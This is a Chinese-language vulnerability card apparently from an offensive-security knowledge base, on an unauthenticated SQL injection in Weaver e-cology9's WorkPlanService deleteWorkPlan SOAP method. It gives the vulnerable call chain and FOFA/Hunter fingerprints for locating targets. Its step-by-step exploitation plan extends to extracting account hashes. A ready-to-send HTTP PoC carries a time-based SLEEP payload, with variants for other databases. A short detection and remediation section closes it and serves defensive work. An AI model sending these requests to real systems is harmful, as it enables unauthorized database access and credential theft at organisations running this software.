---
id: web-generic-sqli-weaver-ecology-workplanservice-deleteworkplan
title: 泛微 e-cology9 WorkPlanService 前台 SQL 注入：deleteWorkPlan 的 workid 直拼 WorkPlan 查询
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-ecology-workplanservice-deleteworkplan-sqli
aliases:
- 泛微 WorkPlanService SQL注入
- e-cology9 deleteWorkPlan
- DeleteWorkPlanCmd 注入
- WorkPlan id 拼接
- SOAP in0 注入
- 泛微前台SQL注入
tags:
- web
- sqli
- java
- oa
- weaver
- ecology
- soap
- webservice
- unauth
- mysql
- time-based
- string-concat
cve: []
severity: critical
confidence: high
status: verified
affected_versions: 泛微 e-cology9（原文标题标注，未给出具体小版本/区间）
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V275
  verified_at: '2026-11-07T23:21:03+08:00'
  notes: 已对照原文核对：services.xml 中 WorkPlanService（namespace webservices.workplan.weaver.com.cn、implementationClass weaver.WorkPlan.webservices.WorkplanServiceImpl，图01）、WorkplanServiceImpl.deleteWorkPlan(String,int) 的 HashMap.put(workid)（图04）、DeleteWorkPlanCmd.execute 的 RecordSet.executeSql("SELECT status,resourceid FROM WorkPlan WHERE id = "+var3) 拼接点（图06）与卡片一致；PoC in0 SLEEP(5-(IF(27=27,0,5)))/in1=22，图07 响应 200、339 bytes/5709ms 与卡片一致；getShareLevel==2 前置条件与 detailid 回退均已写入。未验证点：未复跑目标；原文称前台但未单独给出无 Cookie 鉴权对照（图07 响应会下发新 JSessionid，与未登录请求一致）；frontmatter 无 sources/source_url；affected_versions 按原文标题『泛微e-cology9』保留、原文无具体小版本/区间，未另设版本。
---

## 一句话结论

泛微 e-cology9 的 `/services/WorkPlanService` SOAP 接口无需登录即可调用 `deleteWorkPlan`，`in0`（workid）经 `WorkplanServiceImpl → WorkPlanBaseService → DeleteWorkPlanCmd.execute` 后直接拼进 `SELECT status, resourceid FROM WorkPlan WHERE id = <workid>`；workid 为空时还会回退到 `detailid`，同样可注入。用 MySQL 时间盲注（`SLEEP(5-(IF(27=27,0,5)))`）实测响应约 5.7 秒。

## 原理

- **服务暴露**：`services.xml` 中配置 `<service><name>WorkPlanService</name><namespace>webservices.workplan.weaver.com.cn</namespace><serviceClass>weaver.WorkPlan.webservices.WorkplanService</serviceClass><implementationClass>weaver.WorkPlan.webservices.WorkplanServiceImpl</implementationClass></service>`，该 SOAP 服务在前台可访问。
- **调用链**：SOAP 请求 `<web:deleteWorkPlan><web:in0>...</web:in0><web:in1>22</web:in1></web:deleteWorkPlan>` → `WorkplanServiceImpl.deleteWorkPlan(String var1, int var2)`：`new User(var2)`、`HashMap var5.put("workid", var1)`、`WorkPlanBaseService.deleteWorkPlan(var5)`。
- **注入点**：`DeleteWorkPlanCmd.execute` 中 `var3 = Util.null2String(params.get("workid"))`，为空则取 `detailid`；非空时先 `WorkPlanShareUtil.getShareLevel(var3, user)`，返回 2 后执行 `RecordSet.executeSql("SELECT status, resourceid FROM WorkPlan WHERE id = " + var3)`。
- `var3` 只经过 `Util.null2String`（null→""），没有整数解析、引号处理或参数化；workid 位于数字上下文，可直接注入 `(SELECT ... SLEEP ...)`、`AND`、`UNION` 等。
- 同类的 `deleteWorkplanFinish(String)` 使用 `executeUpdate("... where workplanid = ?", new Object[]{var1})` 参数化，说明问题集中在 WorkPlan 查询这一处字符串拼接。
- 前置的 `getShareLevel` 可能先执行，但原文 PoC 实测可触发（响应 5709ms），说明该路径可走通；若被权限判断短路，可尝试 workid 留空走 detailid 回退或调整用户 ID。

## 触发条件

- 目标为泛微 e-cology9，`/services/WorkPlanService` 可达且 `deleteWorkPlan` 方法未禁用。
- 数据库为 MySQL（原文 SLEEP 时间盲注）；其他数据库需换对应时间/布尔函数。
- `in0`（workid）或 detailid 可控；`in1` 为用户 ID（int），需为可接受的值。
- 服务端未对该 SOAP 方法做鉴权或输入类型校验。

## 利用步骤

1. 指纹确认：FOFA `app="泛微-协同商务系统"`、Hunter `app.name=="泛微 e-cology 9.0 OA"`，或直接探测 `/services/WorkPlanService`。
2. 发送正常 SOAP 请求，确认服务与方法存在、返回结构与错误信息。
3. 在 in0 放入 `(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)`，对比正常响应与约 5 秒延迟，确认时间盲注。
4. 用条件化 SLEEP 或布尔表达式提取库名、表名、账号哈希等；若有回显可改用 UNION（按列数调整）。
5. 若 workid 路径受限，留空尝试 detailid 回退；必要时调整 in1 用户 ID。
6. 记录请求、响应时间差与数据库类型证据；控制数据读取范围。

## PoC

```http
POST /services/WorkPlanService HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Content-Type: text/xml;charset=UTF-8
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
  <soapenv:Header/>
  <soapenv:Body>
    <web:deleteWorkPlan>
      <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>
      <web:in1>22</web:in1>
    </web:deleteWorkPlan>
  </soapenv:Body>
</soapenv:Envelope>
```

```text
# 预期：HTTP/1.1 200，响应时间约 5 秒（原文 5709ms，正常响应数百毫秒）。
# SQL 落点：SELECT status, resourceid FROM WorkPlan WHERE id = <in0>
```

## 变体与关联

- 变体：workid 为空时走 `detailid` 回退，detailid 同样进入 `var3`，可测试同一注入。
- 变体：数据库非 MySQL 时改用 `WAITFOR DELAY`、`pg_sleep`、`dbms_pipe.receive_message`；有回显时可 UNION。
- 关联：[[web-generic-sqli-weaver-mobilemode-runsql-datasource-bypass]]（同产品后台 runSQL 注入）、[[web-generic-sqli-weaver-e9-browser-jsp-double-slash-sqli]]、[[web-generic-sqli-weaver-e9-doc-out-more-list-boolean-blind]]、[[web-generic-sqli-weaver-e9-filedownloadlocation-union-file-read]]（同产品其他注入点）、[[web-generic-auth-weaver-ecology-mobilemode-token-chain-login-bypass]]（同产品前台登录绕过）。
- 边界：服务被移除/方法被禁用、workid 改为整数校验/参数化、数据库低权限/无回显时，注入类型与危害受限。

## 检测与防御

- 检测：POST `/services/WorkPlanService` 的 SOAP body 中 in0 含 `SLEEP`、`IF`、`UNION`、`AND`、注释符；同一 IP 对 WorkPlanService 高频请求且响应时间异常；日志出现 `deleteWorkPlan` 异常。
- 修复：WorkPlanService 增加鉴权；`DeleteWorkPlanCmd` 改用参数化查询（`WHERE id = ?` 并绑定 var3），workid/detailid 强制整数解析；限制该 SOAP 服务的暴露面。
- 加固：WAF 仅作辅助；数据库账户最小权限；升级泛微补丁；对 `/services/*` 做访问控制与审计。
